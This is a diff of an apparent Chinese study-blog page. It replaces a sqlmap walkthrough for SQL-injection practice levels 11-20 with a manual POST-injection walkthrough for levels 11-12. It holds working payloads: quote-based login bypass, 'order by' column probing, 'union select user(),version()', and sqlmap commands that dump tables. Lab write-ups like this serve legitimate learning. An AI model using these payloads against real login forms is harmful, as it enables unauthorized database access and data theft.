@@ -5,17 +5,17 @@
   
 
   
-  <title>page less 11-20 | Hexo</title>
+  <title>page十一关手动注入 十二也可以 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头  然后随便生成一个文本文档粘贴进去  再在网页那边随便输入用户名密码  再次复制 这次复制post数据像这样子的uname&#x3D;aaa&amp;passwd&amp;submit&#x3D;Submit&#x2F;&#x2F;&amp;这个符号要自己加 之后win+r cmd sqlmap.py">
+  <meta name="description" content="先判断注入类型  用火狐下载个插件hackbar  然后 post data那边输入 uname&#x3D;admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit （十二关是双引号 就加上“）） 这关的就有提示单引号注入 那么uname&#x3D;admin’ #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 输入这段 登陆">
 <meta property="og:type" content="article">
-<meta property="og:title" content="page less 11-20">
-<meta property="og:url" content="http://example.com/2021/01/20/page-8/index.html">
+<meta property="og:title" content="page十一关手动注入 十二也可以">
+<meta property="og:url" content="http://example.com/2021/01/24/page-11/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头  然后随便生成一个文本文档粘贴进去  再在网页那边随便输入用户名密码  再次复制 这次复制post数据像这样子的uname&#x3D;aaa&amp;passwd&amp;submit&#x3D;Submit&#x2F;&#x2F;&amp;这个符号要自己加 之后win+r cmd sqlmap.py">
+<meta property="og:description" content="先判断注入类型  用火狐下载个插件hackbar  然后 post data那边输入 uname&#x3D;admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit （十二关是双引号 就加上“）） 这关的就有提示单引号注入 那么uname&#x3D;admin’ #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 输入这段 登陆">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-20T06:43:56.000Z">
-<meta property="article:modified_time" content="2021-01-22T12:26:51.633Z">
+<meta property="article:published_time" content="2021-01-24T09:35:33.000Z">
+<meta property="article:modified_time" content="2021-01-24T09:36:29.241Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -66,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-page-8" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-page-11" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/01/20/page-8/" class="article-date">
-  <time datetime="2021-01-20T06:43:56.000Z" itemprop="datePublished">2021-01-20</time>
+    <a href="/2021/01/24/page-11/" class="article-date">
+  <time datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
 </a>
     
   </div>
@@ -80,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      page less 11-20
+      page十一关手动注入 十二也可以
     </h1>
   
 
@@ -88,19 +88,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头</p>
-<p> 然后随便生成一个文本文档粘贴进去 </p>
-<p>再在网页那边随便输入用户名密码 </p>
-<p>再次复制 这次复制post数据像这样子的uname=aaa&amp;passwd&amp;submit=Submit//&amp;这个符号要自己加</p>
-<p>之后win+r cmd sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” –current-db –batch </p>
-<p>爆出当前数据库 之后sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” -D 库名 –tables –batch</p>
-<p>库名表明 爆表名字是需要 -C 表明 –dump 加上个dump </p>
-<p>ps 如果觉得速度慢点话加个 –thread 10 有的关如果爆不出来提高level  –level 2-5选一个</p>
+        <p>先判断注入类型 </p>
+<p>用火狐下载个插件hackbar </p>
+<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
+<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
+<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
+<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
+<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
+<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
+<p>之后操作就和第一关是一样的都是那些语句</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/20/page-8/" data-id="ckk89atnp0000i8v7cpjf6eqo" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/24/page-11/" data-id="ckkay6gmn0000p0v78d5dgon8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -109,19 +110,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/22/page-9/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          sqlmap抓包功能
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/11/25/page-5/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/01/22/page-9/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">盲注</div>
+      <div class="article-nav-title">sqlmap抓包功能</div>
     </a>
   
 </nav>
